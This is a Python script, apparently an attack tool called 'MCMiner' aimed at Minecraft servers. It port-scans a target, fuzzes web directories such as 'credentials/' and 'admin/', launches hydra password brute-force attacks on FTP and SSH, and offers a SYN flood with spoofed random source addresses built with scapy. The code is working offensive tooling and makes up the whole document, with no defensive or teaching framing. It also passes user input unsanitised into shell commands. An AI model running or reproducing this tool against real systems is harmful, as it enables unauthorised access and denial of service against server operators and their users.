from colorama import Fore, init
import requests
from sys import stdout
from scapy.all import *
import socket
from random import randint
import threading
import time

from scapy.layers.inet import TCP, IP

Fore.LR = Fore.LIGHTRED_EX
Fore.LG = Fore.LIGHTGREEN_EX
Fore.W = Fore.LIGHTWHITE_EX
Fore.B = Fore.BLUE
Fore.LB = Fore.LIGHTBLUE_EX
Fore.R = Fore.RESET
Fore.Y = Fore.YELLOW
Fore.LBEX = Fore.LIGHTBLACK_EX
Fore.LWEX = Fore.LIGHTWHITE_EX
init()

dirs = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
        'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
        'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
        'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
        'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
FTP = False
SSH = False
Website = False

os.system('title MCMiner by wfsec')
print(f'''

    {Fore.LG}        
    {Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
    {Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
    {Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
    {Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
    {Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
    {Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
    ''')

ip = input('            IP: ')

print('')
print('')

PORTS = {21: 'FTP',
         22: 'SSH',
         23: 'TELNET',
         53: 'DNS',
         80: 'HTTP',
         443: 'HTTPS',
         3389: 'RDP',
         8080: 'ALT HTTP',
         19312: 'Bedrock',
         25565: 'JavaServer'}


def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("             Packets are sending...")

    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        window = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = window

        send(IP_Packet / TCP_Packet, verbose=0)
        print(f'             {Fore.LB}[{total}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dstIP}:{dstPort}{Fore.W}')
        total += 1

    stdout.write("\n             Total packets sent: %i\n" % total)


def info():
    dstIP = input("\n             Target IP: ")
    dstPort = input("             Target Port: ")

    return dstIP, int(dstPort)


def ddos():
    dstIP, dstPort = info()
    counter = input("             How many packets do you want to send: ")
    SYN_Flood(dstIP, dstPort, int(counter))


for port in PORTS:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)  # Terminate connection if no response after 3 seconds
    result = s.connect_ex((ip, port))

    if result == 0:
        if port == 21:
            FTP = True
        if port == 22:
            SSH = True
        if port == 80:
            Website = True
        print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
        s.close()
    else:
        print(
            f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
        s.close()

resp = requests.get(f'https://api.mcsrvstat.us/2/{ip}')  # Query the server status API
print('')

SRV = resp.json().get("srv")
SERVER_IP = resp.json().get("ip")
ONLINE_MODE = resp.json().get("online")
VERSION = resp.json().get("version")
QUERY = resp.json().get("query")

print(f'''
            {Fore.RED}Query:{Fore.R} {QUERY}
            {Fore.RED}Version:{Fore.R} {VERSION}
            {Fore.RED}Online Mode:{Fore.R} {ONLINE_MODE}
            {Fore.RED}Server IP:{Fore.R} {SERVER_IP}
            {Fore.RED}SRV:{Fore.R} {SRV}
''')


def fuzz(directory):
    fuzz_url = f'http://{ip}/{directory}'
    status = requests.get(fuzz_url, headers=user_agent).status_code

    if status == 200:
        meaning = '[OK]'
        color = Fore.LIGHTGREEN_EX
    elif status == 403:
        meaning = '[Forbidden]'
        color = Fore.LIGHTRED_EX
    elif status == 404:
        meaning = '[Not Found]'
        color = Fore.LIGHTRED_EX
    elif status == 429:
        meaning = '[Too Many Requests]'
        color = Fore.LIGHTYELLOW_EX
    else:
        meaning = ''
        color = Fore.LIGHTBLUE_EX
    print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')


def threads_handler():
    for directory in dirs:
        fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
        time.sleep(2)
        fuzz_thread.start()


if Website:
    WebASK = input('            Do you want to information about website? y/n: ')
    if WebASK == 'y':
        user_agent = {
            'User-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1'}
        r = requests.get(f'http://{ip}', headers=user_agent)
        print('')
        for res in r.history:
            print(f'            {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')
        d = requests.head(f'http://{ip}', headers=user_agent)
        print(f'''
                {Fore.LB}Server:{Fore.W} {d.headers["server"]}
                {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
        ''')
        print('')

        fuzzask = input('            Do you want to fuzz the site? y/n: ')
        if fuzzask == 'y':
            threads_handler()
        else:
            print('               Ok.')
            print('')
    else:
        print('               Ok.')
        print('')

if FTP:
    print('')
    FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')
    if FTPASK == 'y':
        the_proto = 'ftp'
        ftp_username_wordlist = input('             Username Wordlist: ')
        ftp_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                    ''')

if SSH:
    print('')
    SSHASK = input('             Do you want to Wordlist attack on SSH? y/n: ')
    if SSHASK == 'y':
        the_proto = 'ssh'
        ssh_username_wordlist = input('             Username Wordlist: ')
        ssh_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                    ''')

ddos_ask = input('            Do you want to try DDoSing? y/n: ')
if ddos_ask == 'y':
    ddos()
else:
    print('               Ok.')
    print('')
